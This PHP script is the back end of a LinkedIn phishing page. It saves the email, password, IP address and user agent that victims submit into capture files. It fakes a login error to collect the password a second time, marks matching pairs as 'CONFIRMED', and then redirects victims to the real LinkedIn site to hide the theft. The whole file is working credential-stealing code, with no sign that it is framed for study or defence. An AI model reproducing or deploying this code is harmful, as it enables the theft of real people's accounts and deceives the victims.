<?php
session_start();

$platform = 'linkedin';
$code = 'LIN';
$dir = '../../captures/' . $code;

if (!file_exists($dir)) mkdir($dir, 0755, true);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
}
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$attempt = $_POST['attempt'] ?? '1';
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';

$file = $dir . '/LIN_' . date('Ymd_His') . '_attempt' . $attempt . '.txt';
$content = "PLATFORM: $platform\nEMAIL: $email\nPASSWORD: $pass\nIP: $ip\nUA: $ua\n";
file_put_contents($file, $content, FILE_APPEND);

if ($attempt == '1') {
    $_SESSION['li_email'] = $email;
    $_SESSION['li_pass1'] = $pass;
    header('Location: index.html?error=1&email=' . urlencode($email));
} else {
    if ($pass === ($_SESSION['li_pass1'] ?? '')) {
        file_put_contents($dir . '/CONFIRMED_SUMMARY.txt', 
            "✅ CONFIRMED | $email | $pass | " . date('Y-m-d H:i:s') . "\n", 
            FILE_APPEND);
    }
    session_destroy();
    header('Location: https://www.linkedin.com');
}
exit;
?>